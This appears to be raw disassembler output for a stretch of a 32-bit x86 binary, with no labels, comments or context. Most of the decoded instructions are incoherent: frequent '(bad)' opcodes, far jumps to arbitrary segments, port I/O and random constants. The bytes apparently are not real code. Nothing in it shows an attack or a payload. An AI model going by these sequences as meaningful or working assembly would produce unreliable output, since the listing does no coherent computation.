  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xb196fc2d
  415102:	xchg   ecx,eax
  415103:	call   0x104:0xde0c
  41510a:	add    BYTE PTR [eax],al
  41510c:	retf   
  41510d:	adc    ecx,edi
  41510f:	adc    DWORD PTR [ebx],ebx
  415111:	mov    bh,0xd
  415113:	mov    WORD PTR [edi],?
  415115:	test   DWORD PTR [edi],edi
  415117:	xor    ebx,DWORD PTR [ebp-0x3776879b]
  41511d:	sar    BYTE PTR [edx-0x70],cl
  415120:	stos   DWORD PTR es:[edi],eax
  415121:	jge    0x415121
  415123:	es mov dh,0xe3
  415126:	ss pop ecx
  415128:	jo     0x4150fa
  41512a:	sar    DWORD PTR [edx+0x5454da78],1
  415130:	ror    BYTE PTR [eax],0x80
  415133:	mov    dh,0xd1
  415135:	dec    ebx
  415136:	or     edx,DWORD PTR [edx+ecx*1]
  415139:	in     eax,dx
  41513a:	fwait
  41513b:	jmp    0xd431:0x32aff320
  415142:	ret    0x650a
  415145:	xchg   esi,eax
  415146:	(bad)  
  415147:	frstor [ebp-0x70]
  41514a:	sub    DWORD PTR ds:0x14210e9,esp
  415150:	sbb    BYTE PTR [eax],0xc2
  415153:	ret    
  415154:	idiv   DWORD PTR [eax+0x50a6ae6b]
  41515a:	pusha  
  41515b:	fstp   DWORD PTR [ebx]
  41515d:	fs mov edi,0xd6df06fc
  415163:	pop    ds
  415164:	inc    esi
  415165:	call   0x3217:0xcae0ae1e
  41516c:	inc    ebp
  41516d:	ja     0x41513f
  41516f:	xor    al,0x44
  415171:	mov    bl,0xe5
  415173:	mov    ds:0x53f828cc,al
  415178:	outs   dx,DWORD PTR ds:[esi]
  415179:	test   dl,bh
  41517b:	movzx  ebx,WORD PTR [esi]
  41517e:	add    ah,bh
  415180:	imul   ebx,ebp,0xb453d975
  415186:	je     0x4151cc
  415188:	pop    edi
  415189:	xor    BYTE PTR [edi+0x165c79cf],bh
  41518f:	and    BYTE PTR [ebp+0x12a505a5],ch
  415195:	push   esp
  415196:	mov    bh,0xd7
  415198:	add    bh,BYTE PTR [ebx-0x28]
  41519b:	shr    esp,cl
  41519d:	sahf   
  41519e:	adc    ah,ah
  4151a0:	rcl    ecx,cl
  4151a2:	pushf  
  4151a3:	sub    eax,0xa9c6c832
  4151a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a9:	out    dx,eax
  4151aa:	cli    
  4151ab:	repz sub BYTE PTR [eax],cl
  4151ae:	mov    ah,0xb5
  4151b0:	sub    DWORD PTR [ecx],0xffffffa6
  4151b3:	adc    edi,DWORD PTR [ebp-0x31db8088]
  4151b9:	jl     0x4151f3
  4151bb:	retf   0x4c19
  4151be:	jno    0x4151eb
  4151c0:	mov    ecx,0x475ade9c
  4151c5:	inc    esi
  4151c6:	into   
  4151c7:	pop    eax
  4151c8:	push   ds
  4151c9:	pop    ds
  4151ca:	push   eax
  4151cb:	fldenv [esp+ebp*8-0x5dafc151]
  4151d2:	frstor [ebx]
  4151d4:	jb     0x4151d9
  4151d6:	jmp    0x12bbe883
  4151db:	ss jg  0x415252
  4151de:	pop    esi
  4151df:	repnz xchg edi,eax
  4151e1:	out    dx,al
  4151e2:	leave  
  4151e3:	pop    eax
  4151e4:	call   0xaebf:0x869e8893
  4151eb:	add    BYTE PTR [ebx],0x60
  4151ee:	adc    ch,BYTE PTR [ebx]
  4151f0:	push   ss
  4151f1:	mov    ah,0x15
  4151f3:	pop    esi
  4151f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151f5:	shr    BYTE PTR [eax+ecx*2],1
  4151f8:	xlat   BYTE PTR ds:[ebx]
  4151f9:	push   ebp
  4151fa:	or     edi,ebp
  4151fc:	add    eax,0x24cb5f7b
  415201:	pop    ebp
  415202:	nop
  415203:	pop    es
  415204:	imul   ebx,DWORD PTR ss:[ecx+eiz*2],0x6481d302
  41520c:	aam    0xf9
  41520e:	xor    eax,ebp
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x49387d0b
  415283:	sub    al,0x10
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	retf   0x5ccc
  41528f:	imul   ebx,ebp,0x8d9ab7ce
  415295:	adc    DWORD PTR [ecx-0x228293d7],ebp
  41529b:	es mov al,0x40
  41529e:	daa    
  41529f:	loop   0x415317
  4152a1:	mov    ds:0x7396844,eax
  4152a6:	stos   BYTE PTR es:[edi],al
  4152a7:	jmp    0x4285:0x7b75e7a4
  4152ae:	dec    ecx
  4152af:	jg     0x415265
  4152b1:	push   cs
  4152b2:	sub    eax,0x9d49dea4
  4152b7:	outs   dx,DWORD PTR ds:[esi]
  4152b8:	mov    bl,0xa9
  4152ba:	jecxz  0x4152f1
  4152bc:	add    DWORD PTR [ecx],esp
  4152be:	push   ebx
  4152bf:	sti    
  4152c0:	test   eax,0xa49f5b39
  4152c5:	or     DWORD PTR [edi+0x7e],edi
  4152c8:	(bad)  
  4152ca:	pop    esp
  4152cb:	shr    bh,cl
  4152cd:	xchg   DWORD PTR [ebx],esp
  4152cf:	pusha  
  4152d0:	sub    ebx,ecx
  4152d2:	ror    dl,0x18
  4152d5:	adc    eax,0x25d3f86d
  4152da:	fstp   TBYTE PTR [ebx-0x44450710]
  4152e0:	inc    ecx
  4152e1:	adc    ecx,DWORD PTR [eax-0x4b4a8d3b]
  4152e7:	je     0x41534a
  4152e9:	sahf   
  4152ea:	test   al,0xbd
  4152ec:	sbb    al,BYTE PTR [edi+0x6d]
  4152ef:	stc    
  4152f0:	dec    esp
  4152f1:	mov    DWORD PTR [eax],esi
  4152f3:	cmp    BYTE PTR [ebx+0x28be58d4],dl
  4152f9:	jecxz  0x415352
  4152fb:	(bad)  
  4152fc:	call   0xb433:0x75bf586e
  415303:	dec    BYTE PTR [eax]
  415305:	rcl    BYTE PTR [esp+eiz*4],0x20
  415309:	sub    DWORD PTR [ebp-0x5b895f29],0xfffffff5
  415310:	stc    
  415311:	repz shr BYTE PTR [edx-0x2d25312c],0xc1
  415319:	jae    0x415373
  41531b:	xchg   edx,eax
  41531c:	mov    DWORD PTR [ecx-0x54],ebx
  41531f:	fwait
  415320:	push   ds
  415321:	sub    DWORD PTR [esi-0x6],esp
  415324:	xor    al,BYTE PTR [esi+0x69]
  415327:	jo     0x41531b
  415329:	and    al,0xf0
  41532b:	xor    bh,ah
  41532d:	adc    al,0xaa
  41532f:	add    bl,BYTE PTR [ebp+0x59f0b1b2]
  415335:	aam    0x43
  415337:	repnz and DWORD PTR [eax+0x3a],edi
  41533b:	lods   al,BYTE PTR ds:[esi]
  41533c:	jae    0x4152c7
  41533e:	aam    0xe6
  415340:	mov    ds:0x7d16a9f3,eax
  415345:	out    dx,al
  415346:	rol    DWORD PTR [edx+0x14275db9],0x7a
  41534d:	test   eax,0x3837a92a
  415352:	mov    ah,BYTE PTR [ecx]
  415354:	jle    0x4153a5
  415356:	fisubr DWORD PTR [edx+0x7c]
  415359:	loop   0x415360
  41535b:	js     0x41535d
  41535d:	int3   
  41535e:	xchg   di,ax
  415360:	pop    esp
  415361:	popf   
  415362:	stos   DWORD PTR es:[edi],eax
  415363:	scas   eax,DWORD PTR es:[edi]
  415364:	bnd js 0x415375
  415367:	push   esi
  415368:	dec    eax
  415369:	cld    
  41536a:	dec    esi
  41536b:	jno    0x4153cf
  41536d:	pop    edx
  41536e:	popa   
  41536f:	mov    ds:0x585751fa,al
  415374:	sub    al,0x7e
  415376:	mov    DWORD PTR [ebx-0xf],ecx
  415379:	cmp    dl,dl
  41537b:	(bad)
  41537e:	cmc    
  41537f:	jg     0x4153fe
  415381:	jb     0x4153ed
  415383:	adc    ebp,0x62cdad94
  415389:	imul   esp,DWORD PTR [esi-0x1d],0x69e3e709
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x8cd3e5b0
  415401:	inc    edi
  415402:	data16 cmp dl,BYTE PTR [eax+eiz*8]
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	xor    ebp,DWORD PTR [esi]
  41540e:	repz sbb bl,dh
  415411:	and    edi,ebx
  415413:	ret    
  415414:	push   ds
  415415:	in     eax,dx
  415416:	xchg   DWORD PTR [edi-0x7b],edi
  415419:	loope  0x41546b
  41541b:	call   0x5849:0x6dcb3bb9
  415422:	out    dx,al
  415423:	mov    al,0x71
  415425:	mov    esp,0x53a7ed8b
  41542a:	shl    dl,0x58
  41542d:	popf   
  41542e:	jg     0x4153da
  415430:	push   0xe87be39b
  415435:	jnp    0x415445
  415437:	push   ebx
  415438:	sbb    BYTE PTR [edx],cl
  41543a:	sahf   
  41543b:	jge    0x4153eb
  41543d:	je     0x4154bd
  41543f:	cli    
  415440:	aaa    
  415441:	sub    DWORD PTR ds:0x2e978973,esp
  415447:	int3   
  415448:	js     0x41546a
  41544a:	cmp    cl,cl
  41544c:	jbe    0x4154c8
  41544e:	ret    
  41544f:	push   0x41
  415451:	lock mov al,ds:0xcc4bee1c
  415457:	ins    DWORD PTR es:[edi],dx
  415458:	sbb    DWORD PTR [eax-0x77fadf9b],esp
  41545e:	or     BYTE PTR [edx],cl
  415460:	aas    
  415461:	mov    esp,0xa4eb9156
  415466:	(bad)  
  415467:	daa    
  415468:	mov    ds:0x16653053,eax
  41546d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41546e:	inc    esi
  41546f:	(bad)  
  415471:	ret    
  415472:	mov    al,ds:0x72362b63
  415477:	int    0xec
  415479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41547a:	test   BYTE PTR [edi-0x30],ch
  41547d:	stos   BYTE PTR es:[edi],al
  41547e:	stos   BYTE PTR es:[edi],al
  41547f:	loope  0x4154f1
  415481:	call   0x2057c4ba
  415486:	outs   dx,BYTE PTR ds:[esi]
  415487:	xlat   BYTE PTR ds:[ebx]
  415488:	dec    esi
  415489:	std    
  41548a:	xchg   edi,eax
  41548b:	test   eax,0xee35470f
  415490:	xchg   DWORD PTR [edx+0x5f],edi
  415493:	inc    edx
  415494:	mov    cl,0x56
  415496:	pusha  
  415497:	adc    eax,0x30c53f5b
  41549c:	xor    DWORD PTR [ebx+ebp*8-0x6e],0x52c3588f
  4154a4:	jl     0x4154d5
  4154a6:	push   ebx
  4154a7:	frstor [esi+0x12ed49d]
  4154ad:	xchg   edx,eax
  4154ae:	sbb    ebx,DWORD PTR [ebp+0x62a995bd]
  4154b4:	test   eax,0x9e70216c
  4154b9:	test   DWORD PTR [ecx],eax
  4154bb:	fist   WORD PTR [ebx+0x5858642b]
  4154c1:	sbb    DWORD PTR [si-0x75],edi
  4154c5:	adc    BYTE PTR [edx-0x35],dh
  4154c8:	xchg   ebp,eax
  4154c9:	jno    0x4154d3
  4154cb:	jae    0x415470
  4154cd:	shl    DWORD PTR [edx+0x60],1
  4154d0:	dec    eax
  4154d1:	sbb    DWORD PTR [edx-0x56569e13],edi
  4154d7:	fwait
  4154d8:	sbb    eax,0x59225f77
  4154dd:	aaa    
  4154de:	arpl   WORD PTR [edx],di
  4154e0:	aad    0x29
  4154e2:	rol    BYTE PTR [ebp-0x7c5aebfe],cl
  4154e8:	xchg   edi,eax
  4154e9:	inc    esi
  4154ea:	stos   DWORD PTR es:[edi],eax
  4154eb:	lods   al,BYTE PTR ds:[esi]
  4154ec:	into   
  4154ed:	adc    bl,BYTE PTR [esi+0x7a1e6432]
  4154f3:	and    BYTE PTR [edx+0x72],ch
  4154f6:	test   DWORD PTR ds:0xd951194e,esi
  4154fc:	inc    ecx
  4154fd:	mov    al,ds:0xb8b30d27
  415502:	push   ebx
  415503:	push   ebp
  415504:	push   edx
  415505:	es xchg esp,eax
  415507:	push   ebp
  415508:	sahf   
  415509:	or     BYTE PTR [esi+ebx*8],al
  41550c:	mov    eax,0xb681b7
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41555f
  415581:	jae    0x415559
  415583:	xchg   ebp,eax
  415584:	sbb    cl,ah
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	(bad)  [eax+0x5464fc24]
  415592:	aad    0x7d
  415594:	push   cs
  415595:	jns    0x4155d5
  415597:	sti    
  415598:	push   0xbf5f4319
  41559d:	gs scas eax,DWORD PTR es:[edi]
  41559f:	fst    DWORD PTR [esi-0x27]
  4155a2:	inc    ecx
  4155a3:	sub    BYTE PTR [ebp+0x554a596c],bl
  4155a9:	ficomp DWORD PTR [edi]
  4155ab:	out    dx,eax
  4155ac:	and    cl,BYTE PTR [edx+edi*1+0x4ab4c45e]
  4155b3:	aam    0x9a
  4155b5:	ja     0x415566
  4155b7:	or     al,BYTE PTR [ebp-0x58]
  4155ba:	loop   0x415577
  4155bc:	mov    ebp,0x621e94c5
  4155c1:	cs push ebp
  4155c3:	cmp    BYTE PTR [edx+0x5e],dh
  4155c6:	jae    0x415622
  4155c8:	std    
  4155c9:	pop    eax
  4155ca:	imul   ebx,DWORD PTR [esi-0x1269d1d2],0x4a8e401b
  4155d4:	fld    QWORD PTR [edi]
  4155d6:	pushf  
  4155d7:	aad    0x9f
  4155d9:	ins    DWORD PTR es:[edi],dx
  4155da:	fisttp DWORD PTR gs:[ebp+0x187f047d]
  4155e1:	sub    esp,ecx
  4155e3:	or     esi,DWORD PTR [ebp+0x49bc6780]
  4155e9:	dec    esp
  4155ea:	addr16 sahf 
  4155ec:	in     eax,0x88
  4155ee:	xchg   cl,ah
  4155f0:	adc    ah,0x61
  4155f3:	outs   dx,BYTE PTR ds:[esi]
  4155f4:	loopne 0x4155c9
  4155f6:	scas   eax,DWORD PTR es:[edi]
  4155f7:	add    DWORD PTR [ebx-0x18],esp
  4155fa:	sbb    ch,dh
  4155fc:	int    0x3f
  4155fe:	pop    edx
  4155ff:	shr    ebp,cl
  415601:	mov    ah,BYTE PTR [esi]
  415603:	out    0x3b,eax
  415605:	gs cdq 
  415607:	call   0x66dc2469
  41560c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41560d:	daa    
  41560e:	cmp    ebp,DWORD PTR [eax+0x28f06dbf]
  415614:	js     0x4155a9
  415616:	aas    
  415617:	mov    eax,ds:0xe961a2ec
  41561c:	jmp    0xe64bd569
  415621:	xor    esi,DWORD PTR ds:0x5b0ccd9c
  415627:	popf   
  415628:	mov    eax,0x127330fc
  41562d:	jl     0x41561e
  41562f:	imul   si,WORD PTR [ebp+0x70],0xffe4
  415634:	cs jmp 0x5dab:0x157ef29b
  41563c:	sbb    DWORD PTR [ebx+0x3c],ecx
  41563f:	daa    
  415640:	shr    DWORD PTR [eax+eax*1+0x5f],cl
  415644:	xor    ebx,ebp
  415646:	or     ebx,DWORD PTR [ecx+0x71]
  415649:	push   cs
  41564a:	(bad)  
  41564b:	jnp    0x4156a9
  41564d:	sub    BYTE PTR [eax+0x19],cl
  415650:	jne    0x415671
  415652:	movlps xmm5,QWORD PTR [ecx-0xc]
  415656:	cmc    
  415657:	and    eax,0xb9acdfe4
  41565c:	das    
  41565d:	data16 mov BYTE PTR [ebx],ah
  415660:	and    eax,0x9f110292
  415665:	lods   eax,DWORD PTR ds:[esi]
  415666:	lahf   
  415667:	sar    DWORD PTR [ebx-0x31],cl
  41566a:	rol    DWORD PTR [ecx-0xeb363a7],0x4b
  415671:	stos   BYTE PTR es:[edi],al
  415672:	aas    
  415673:	sbb    ch,bh
  415675:	fcmovnb st,st(7)
  415677:	ins    DWORD PTR es:[edi],dx
  415678:	mov    al,0xf
  41567a:	dec    ebp
  41567b:	jns    0x415640
  41567d:	js     0x415631
  41567f:	push   esp
  415680:	fwait
  415681:	pop    ebx
  415682:	fcmovnb st,st(0)
  415684:	dec    eax
  415685:	stc    
  415686:	addr16 iret 
  415688:	xchg   ebp,eax
  415689:	icebp  
  41568a:	adc    BYTE PTR [edi+ecx*2+0x2a57bc],ch
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	lds    esi,FWORD PTR [ebx+esi*8]
  415703:	jg     0x415721
  415705:	loop   0x415707
  415707:	add    BYTE PTR [ecx+eax*1],al
  41570a:	add    BYTE PTR [eax],al
  41570c:	pop    es
  41570d:	mov    esi,esi
  41570f:	jecxz  0x4156eb
  415711:	pop    esi
  415712:	clc    
  415713:	sub    eax,0x3b683cbb
  415718:	test   al,0xe0
  41571a:	ja     0x41576f
  41571c:	sub    DWORD PTR ss:[edx+0x5a],0x76fde09
  415724:	(bad)  
  415725:	loopne 0x41576d
  415727:	scas   eax,DWORD PTR es:[edi]
  415728:	cmp    eax,0x5c8d8ae4
  41572d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41572e:	(bad)  
  41572f:	test   bh,bh
  415731:	push   0xffffffc2
  415733:	mov    cl,0xeb
  415735:	xchg   DWORD PTR [ebx],edi
  415737:	sbb    al,0x7d
  415739:	nop
  41573a:	ret    
  41573b:	push   0x21
  41573d:	sbb    eax,0x47a9f7f7
  415742:	jecxz  0x4156f2
  415744:	aam    0x32
  415746:	mov    bl,0xd2
  415748:	jl     0x41570a
  41574a:	mov    ds:0xc96cd42b,eax
  41574f:	xchg   DWORD PTR [eax+0x14],ebp
  415752:	mov    ds:0x69a08b86,al
  415757:	adc    dh,BYTE PTR [edi+0x1899745c]
  41575d:	cmp    al,0x91
  41575f:	pop    ebp
  415760:	ds lahf 
  415762:	dec    edi
  415763:	nop
  415764:	sub    DWORD PTR [esi-0x14c4b019],0xdb45a628
  41576e:	repnz popa 
  415770:	das    
  415771:	adc    al,0xdc
  415773:	push   ebx
  415774:	nop
  415775:	outs   dx,BYTE PTR ds:[esi]
  415776:	mov    ah,BYTE PTR [eax+esi*1-0x55]
  41577a:	fwait
  41577b:	add    eax,edi
  41577d:	out    dx,al
  41577e:	in     al,0xb4
  415780:	sbb    DWORD PTR [esi],eax
  415782:	add    DWORD PTR [ebp+0x76],ebx
  415785:	mov    ecx,0x5697f952
  41578a:	xchg   esi,eax
  41578b:	iret   
  41578c:	mov    bl,BYTE PTR [edx]
  41578e:	xor    al,0x68
  415790:	and    al,0x52
  415792:	mov    ?,WORD PTR [eax-0x4]
  415795:	imul   ecx,DWORD PTR [ecx],0xffffffc2
  415798:	fisubr DWORD PTR [esi+0x75]
  41579b:	pop    eax
  41579c:	add    bl,BYTE PTR ds:0x32af4590
  4157a2:	(bad)  
  4157a3:	call   0x147a:0xdbd88603
  4157aa:	lods   al,BYTE PTR ds:[esi]
  4157ab:	mov    dl,0xdc
  4157ad:	fist   DWORD PTR [esp+eax*8]
  4157b0:	cli    
  4157b1:	mov    eax,ds:0xf47dde0c
  4157b6:	popa   
  4157b7:	jp     0x415827
  4157b9:	and    dh,BYTE PTR [edx+edx*8+0x3c]
  4157bd:	stos   BYTE PTR es:[edi],al
  4157be:	ds enter 0x3c4f,0x33
  4157c3:	xor    bl,al
  4157c5:	or     eax,0xb82458d1
  4157ca:	pop    ebp
  4157cb:	adc    esp,DWORD PTR [ebp-0x310a200a]
  4157d1:	mov    cl,0x36
  4157d3:	or     eax,0x5faed0b4
  4157d8:	mov    edi,0x46bde8fa
  4157dd:	dec    ebx
  4157de:	stc    
  4157df:	daa    
  4157e0:	push   0xffffffa9
  4157e2:	lods   eax,DWORD PTR ds:[esi]
  4157e3:	popf   
  4157e4:	imul   edi,DWORD PTR [esi+0x35],0xffffffc6
  4157e8:	repnz out 0xbd,al
  4157eb:	ds aam 0x77
  4157ee:	dec    ebx
  4157ef:	xchg   edx,eax
  4157f0:	out    0x5b,eax
  4157f2:	dec    ebx
  4157f3:	jbe    0x4157a3
  4157f5:	popa   
  4157f6:	scas   eax,DWORD PTR es:[edi]
  4157f7:	mov    al,0x23
  4157f9:	xchg   BYTE PTR [eax],ah
  4157fb:	jl     0x415868
  4157fd:	popf   
  4157fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ff:	cmp    bl,al
  415801:	rcl    BYTE PTR [esp+ebx*8-0x55ef7bcd],0x71
  415809:	rep stos BYTE PTR es:[edi],al
  41580b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41580c:	js     0x415824
  41580e:	jle    0x4157f0
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcl    DWORD PTR [edi+0x206441eb],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR [ecx+eax*1],al
  41588a:	add    BYTE PTR [eax],al
  41588c:	iret   
  41588d:	cmp    DWORD PTR [ecx-0x3d],esp
  415890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415891:	pusha  
  415892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415893:	and    ax,WORD PTR [edx-0x9]
  415897:	pushf  
  415898:	add    bh,BYTE PTR [ebp+0x9]
  41589b:	(bad)  
  41589c:	fdivr  DWORD PTR [ebx]
  41589e:	pop    ebp
  41589f:	int    0xa8
  4158a1:	sahf   
  4158a2:	jecxz  0x415872
  4158a4:	mov    edx,0xd079fbbe
  4158a9:	test   al,0xc7
  4158ab:	loope  0x4158bd
  4158ad:	sbb    esi,ecx
  4158af:	cmp    cl,BYTE PTR [esi]
  4158b1:	in     al,0x4
  4158b3:	test   eax,0x8041af9c
  4158b8:	fs mov ch,0xf7
  4158bb:	push   ebx
  4158bc:	ja     0x4158c4
  4158be:	add    DWORD PTR [edi-0x2eb3a0e4],esp
  4158c4:	sub    bh,BYTE PTR [edx+0x59f3b334]
  4158ca:	outs   dx,DWORD PTR ds:[esi]
  4158cb:	(bad)  
  4158cc:	cmp    edi,ecx
  4158ce:	mov    bh,0xba
  4158d0:	stos   DWORD PTR es:[edi],eax
  4158d1:	mov    eax,ds:0xd9ad1a56
  4158d6:	mov    al,ds:0xaa12d8a6
  4158db:	mov    bl,0x3a
  4158dd:	xchg   DWORD PTR [ecx],ecx
  4158df:	inc    ecx
  4158e0:	sti    
  4158e1:	xor    DWORD PTR [ebp+0x5049b63e],edi
  4158e7:	pusha  
  4158e8:	xchg   ecx,eax
  4158e9:	mov    ebx,0x1862568b
  4158ee:	cld    
  4158ef:	push   es
  4158f0:	sar    DWORD PTR [esp+edx*4+0x927d902],1
  4158f7:	and    eax,0x21
  4158fa:	xlat   BYTE PTR ds:[ebx]
  4158fb:	and    edx,edx
  4158fd:	(bad)  
  4158fe:	mov    ebx,0x7f3f7f48
  415903:	push   edx
  415904:	or     DWORD PTR [edi+0x1],ebx
  415907:	push   ds
  415908:	xchg   esp,eax
  415909:	xchg   esi,eax
  41590a:	mov    BYTE PTR [edx-0x20b8feed],dh
  415910:	sbb    BYTE PTR [ebx],dl
  415912:	push   0xffffff86
  415914:	adc    esp,DWORD PTR [ebx]
  415916:	mov    cl,0x15
  415918:	ins    BYTE PTR es:[edi],dx
  415919:	mov    DWORD PTR [ecx],edx
  41591b:	mov    dh,0x77
  41591d:	stos   DWORD PTR es:[edi],eax
  41591e:	mov    bh,0xb4
  415920:	cmp    BYTE PTR [ebx+0x6d],bl
  415923:	rcl    BYTE PTR [esi],1
  415925:	mov    esp,0x8767da8
  41592a:	sahf   
  41592b:	jmp    0x7a870dc1
  415930:	dec    edx
  415931:	es addr16 in al,dx
  415934:	sahf   
  415935:	inc    BYTE PTR [eax]
  415937:	mov    DWORD PTR [eax+ebp*8-0x2b],ecx
  41593b:	push   es
  41593c:	push   esi
  41593d:	sub    DWORD PTR [ecx+eax*4+0x7c28a55f],esp
  415944:	push   eax
  415945:	ins    DWORD PTR es:[edi],dx
  415946:	mov    al,0xbb
  415948:	pop    ecx
  415949:	dec    esi
  41594a:	mov    esp,0x3ecbca61
  41594f:	test   al,0x9b
  415951:	xchg   ebp,eax
  415952:	pop    ecx
  415953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415954:	cmp    al,0x28
  415956:	sbb    al,0xe2
  415958:	popa   
  415959:	ins    BYTE PTR es:[edi],dx
  41595a:	sub    bl,BYTE PTR [ebx-0x39dcf525]
  415960:	clc    
  415961:	(bad)  
  415962:	idiv   DWORD PTR [eax]
  415964:	mov    eax,ds:0xed5cb29d
  415969:	ins    BYTE PTR es:[edi],dx
  41596a:	enter  0x1ca8,0xf4
  41596e:	adc    BYTE PTR [edi-0x45],0x48
  415972:	add    edi,DWORD PTR [ecx+0xe2b6849]
  415978:	int    0x8d
  41597a:	pop    ecx
  41597b:	cmp    ch,al
  41597d:	jecxz  0x4159db
  41597f:	hlt    
  415980:	(bad)  
  415982:	jge    0x415928
  415984:	je     0x415971
  415986:	leave  
  415987:	fld    QWORD PTR [ebp-0x1ff0c315]
  41598d:	mov    ds:0x4a80,eax
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	pop    edx
  415a01:	outs   dx,DWORD PTR ds:[esi]
  415a02:	aad    0x54
  415a04:	and    al,0xe4
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	adc    BYTE PTR [ebx+ebp*4-0x3d],ah
  415a10:	pop    ecx
  415a11:	and    DWORD PTR [esi-0x53f0c0b],esp
  415a17:	iret   
  415a18:	cmp    edx,DWORD PTR [ebx-0x317dfa14]
  415a1e:	xchg   ebx,eax
  415a1f:	and    ebp,edx
  415a21:	xchg   esi,eax
  415a22:	push   ds
  415a23:	retf   
  415a24:	popf   
  415a25:	push   0x2b3cf1c3
  415a2a:	clc    
  415a2b:	push   ecx
  415a2c:	mov    ds:0x326fa697,al
  415a31:	adc    eax,0x7bdff981
  415a36:	push   edi
  415a37:	inc    edx
  415a38:	cwde   
  415a39:	mov    ebp,0xc051dafb
  415a3e:	sbb    bh,BYTE PTR [ecx+0x68]
  415a41:	or     DWORD PTR [esi],0x754d207e
  415a47:	cmp    eax,0x19e4b046
  415a4c:	and    al,0x2
  415a4e:	mov    bl,0x7e
  415a50:	sub    dh,BYTE PTR [eax+0xf33e90d]
  415a56:	inc    edx
  415a57:	dec    di
  415a59:	pop    ebp
  415a5a:	adc    eax,0x70ad4146
  415a5f:	pop    es
  415a60:	sub    al,0x3
  415a62:	mov    bh,0x43
  415a64:	xor    DWORD PTR [edx+ebp*8],esp
  415a67:	and    eax,0x7df6f7dd
  415a6c:	stc    
  415a6d:	sbb    edi,DWORD PTR [esi+0x4]
  415a70:	sub    DWORD PTR ds:[edi-0x46d1392b],ebp
  415a77:	(bad)  
  415a78:	adc    esi,DWORD PTR [ebx+0x55]
  415a7b:	xchg   ebx,eax
  415a7c:	push   esp
  415a7d:	pop    ecx
  415a7e:	adc    BYTE PTR [edi+0x4e20a44d],bl
  415a84:	or     DWORD PTR [edx+0x50],ebp
  415a87:	push   eax
  415a88:	mov    eax,ds:0x3cbc86a1
  415a8d:	sbb    eax,0x14ab7208
  415a92:	mov    WORD PTR [ecx+0x53],cs
  415a95:	mov    eax,ds:0x712b2521
  415a9a:	pop    edi
  415a9b:	popf   
  415a9c:	mov    ebx,DWORD PTR [edx+0x12f1122f]
  415aa2:	and    BYTE PTR [ebx],0xbc
  415aa5:	pop    esp
  415aa6:	adc    bl,bh
  415aa8:	fcom   QWORD PTR [ebx]
  415aaa:	fwait
  415aab:	js     0x415aa5
  415aad:	mov    edi,0x8b5a2cde
  415ab2:	aad    0x5
  415ab4:	mov    edx,0xc241c54f
  415ab9:	fwait
  415aba:	shr    BYTE PTR [edi+0x54],0xc2
  415abe:	or     BYTE PTR [eax],al
  415ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ac1:	das    
  415ac2:	clc    
  415ac3:	(bad)  
  415ac5:	ror    DWORD PTR [edi-0x434fbde6],0x16
  415acc:	(bad)  
  415acd:	mov    esi,0xa8300539
  415ad2:	sub    eax,0x7a8b621a
  415ad7:	cli    
  415ad8:	pushf  
  415ad9:	outs   dx,DWORD PTR ds:[esi]
  415ada:	ins    DWORD PTR es:[edi],dx
  415adb:	bound  edi,QWORD PTR [eax-0x53]
  415ade:	scas   al,BYTE PTR es:[edi]
  415adf:	outs   dx,DWORD PTR ds:[esi]
  415ae0:	loop   0x415a90
  415ae2:	div    BYTE PTR [edi]
  415ae4:	xchg   edi,eax
  415ae5:	inc    esp
  415ae6:	or     BYTE PTR [edx-0x358e8fc7],ch
  415aec:	ja     0x415ab6
  415aee:	shr    DWORD PTR [edi+0x6e6909c2],0xfb
  415af5:	rol    DWORD PTR [edx-0x32],cl
  415af8:	fcomp  DWORD PTR [ecx]
  415afa:	cmp    DWORD PTR [esi-0x3e4ab9ae],edi
  415b00:	cmc    
  415b01:	test   eax,0x3cbbdf20
